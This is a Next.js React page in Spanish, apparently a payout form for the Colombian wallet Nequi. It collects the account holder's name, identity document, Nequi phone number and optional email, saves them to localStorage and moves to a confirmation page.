"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export default function NequiPage() {
    const router = useRouter();

    const [primerNombre, setPrimerNombre] = useState("");
    const [segundoNombre, setSegundoNombre] = useState("");
    const [primerApellido, setPrimerApellido] = useState("");
    const [segundoApellido, setSegundoApellido] = useState("");

    const [telefonoNequi, setTelefonoNequi] = useState("");
    const [tipoDocumento, setTipoDocumento] = useState("");
    const [cedula, setCedula] = useState("");
    const [correo, setCorreo] = useState("");

    const validarTexto = (texto: string) => {
        return texto.replace(/[^a-zA-Z\s]/g, "");
    };

    const formatAccountNumber = (value: string) => {
        let cleanValue = value.replace(/\D/g, "");
        if (cleanValue.length > 3) {
        cleanValue = cleanValue.slice(0, 3) + "-" + cleanValue.slice(3);
        }
        if (cleanValue.length > 7) {
        cleanValue = cleanValue.slice(0, 7) + "-" + cleanValue.slice(7);
        }
        return cleanValue.slice(0, 12);
    };

    const handleTelefonoChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        setTelefonoNequi(formatAccountNumber(e.target.value));
    };

    const nombreCompleto = `${primerNombre} ${segundoNombre} ${primerApellido} ${segundoApellido}`.replace(/\s+/g, " ").trim();

    const esValido =
        primerNombre.trim() !== "" &&
        primerApellido.trim() !== "" &&
        segundoApellido.trim() !== "" &&
        tipoDocumento.trim() !== "" &&
        cedula.trim() !== "" &&
        telefonoNequi.trim().length === 12;

    const guardarYRedirigir = () => {
        if (!esValido) return;

        localStorage.setItem("nombre_completo", nombreCompleto);
        localStorage.setItem("telefono_nequi", telefonoNequi);
        localStorage.setItem("cedula", cedula);
        localStorage.setItem("tipoDocumento", tipoDocumento);
        localStorage.setItem("correo", correo);

        router.push("/confirmacion");
    };

    return (
        <div>
        <div className="w-full max-w-3xl mb-4">
            <div className="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 rounded-md shadow-md">
            <p className="font-semibold text-center">⚠ Por favor no usar tildes.</p>
            <p className="font-semibold text-center">
                Nuestro sistema de pagos Nequi se encuentra "SATURADO" lo que puede causar retardos en los pagos pero, no te preocupes, tambien puedes usar tus llaves para recibir a Nequi mas rapido.
            </p>
            </div>
        </div>

        <div className="container">

            <div className="input-group">
            <label htmlFor="primer_nombre">Primer nombre</label>
            <div className="input-wrapper">
                <input
                type="text"
                id="primer_nombre"
                placeholder="Primer nobre del titular de nequi"
                value={primerNombre}
                onChange={(e) => setPrimerNombre(validarTexto(e.target.value))}
                />
            </div>
            </div>

            <div className="input-group">
            <label htmlFor="segundo_nombre">Segundo nombre</label>
            <div className="input-wrapper">
                <input
                type="text"
                id="segundo_nombre"
                placeholder="Segundo nobre (opcional)"
                value={segundoNombre}
                onChange={(e) => setSegundoNombre(validarTexto(e.target.value))}
                />
            </div>
            </div>

            <div className="input-group">
            <label htmlFor="primer_apellido">Primer apellido</label>
            <div className="input-wrapper">
                <input
                type="text"
                id="primer_apellido"
                placeholder="Primer apellido del titular de nequi"
                value={primerApellido}
                onChange={(e) => setPrimerApellido(validarTexto(e.target.value))}
                />
            </div>
            </div>

            <div className="input-group">
            <label htmlFor="segundo_apellido">Segundo apellido</label>
            <div className="input-wrapper">
                <input
                type="text"
                id="segundo_apellido"
                placeholder="Segundo apellido del titular de nequi"
                value={segundoApellido}
                onChange={(e) => setSegundoApellido(validarTexto(e.target.value))}
                />
            </div>
            </div>

            <div className="input-group">
            <label htmlFor="tipoDocumento">Tipo de documento</label>
            <select
                id="tipoDocumento"
                value={tipoDocumento}
                onChange={(e) => setTipoDocumento(e.target.value)}
                className="w-full p-2 border border-gray-300 rounded-md bg-white text-black"
            >
                <option value="" disabled>Selecciona tipo de documento</option>
                <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
                <option value="Cédula de extranjería">Cédula de extranjería</option>
                <option value="NIT">NIT</option>
                <option value="Tarjeta de identidad">Tarjeta de identidad</option>
                <option value="PPT">PPT</option>
                <option value="Pasaporte">Pasaporte</option>
                <option value="Fideicomiso">Fideicomiso</option>
                <option value="Registro civil">Registro civil</option>
            </select>
            </div>

            <div className="input-group">
            <label htmlFor="cedula">Número de documento</label>
            <div className="input-wrapper">
                <input
                type="number"
                id="cedula"
                placeholder="Documento del titular"
                value={cedula}
                onChange={(e) => setCedula(e.target.value)}
                />
            </div>
            </div>

            <div className="input-group">
            <label htmlFor="telefono_nequi">Número Nequi</label>
            <div className="input-wrapper">
                <input
                type="tel"
                id="telefono_nequi"
                placeholder="Escribe el número de Nequi"
                value={telefonoNequi}
                onChange={(e) => {
                    setTelefonoNequi(e.target.value);
                    handleTelefonoChange(e);
                }}
                />
            </div>
            </div>

            <div className="input-group">
            <label htmlFor="correo">Correo electrónico</label>
            <div className="input-wrapper">
                <input
                type="email"
                id="correo"
                placeholder="Opcional"
                value={correo}
                onChange={(e) => setCorreo(e.target.value)}
                />
            </div>
            </div>

            <div className="button-group">
            <button onClick={() => router.push("/")}>Atrás</button>
            <button
                id="continuar2"
                onClick={guardarYRedirigir}
                disabled={!esValido}
                className={`${
                esValido
                    ? "bg-[#3b5110] hover:bg-[#589013]"
                    : "bg-gray-300 cursor-not-allowed"
                } text-white font-bold py-2 px-4 rounded`}
            >
                Continuar
            </button>
            </div>
        </div>
        </div>
    );
}
